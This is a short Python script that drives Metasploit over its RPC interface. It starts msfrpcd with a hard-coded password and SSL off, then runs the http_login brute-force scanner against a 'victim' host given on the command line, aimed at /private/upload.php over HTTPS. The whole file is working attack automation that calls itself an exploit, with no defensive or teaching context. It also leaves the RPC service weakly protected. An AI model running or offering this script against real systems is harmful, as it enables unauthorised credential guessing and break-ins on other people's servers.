import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient
import time


os.system("./msfrpcd -P password -S")

time.sleep(5)

victim = sys.argv[1]

print("INITIALIZING EXPLOIT")
print(victim)

while True:
    try:
        client = MsfRpcClient('password', port=55553, ssl=False)
        print("CONNECTED TO MSFRPC")
        break
    except:
        time.sleep(1)

exploit = client.modules.use('auxiliary', 'scanner/http/http_login')
exploit['AUTH_URI'] = '/private/upload.php'
exploit['RHOSTS'] = victim
exploit['RPORT'] = 443
exploit['SSL'] = True
exploit['VERBOSE'] = False

cid = client.consoles.console().cid

sys.stdin.readline()
print(client.consoles.console(cid).run_module_with_output(exploit, None, True))
client.jobs.stop(0)

print("EXPLOIT EXECUTED")
while True:
    print("sleeping...")
    time.sleep(1)
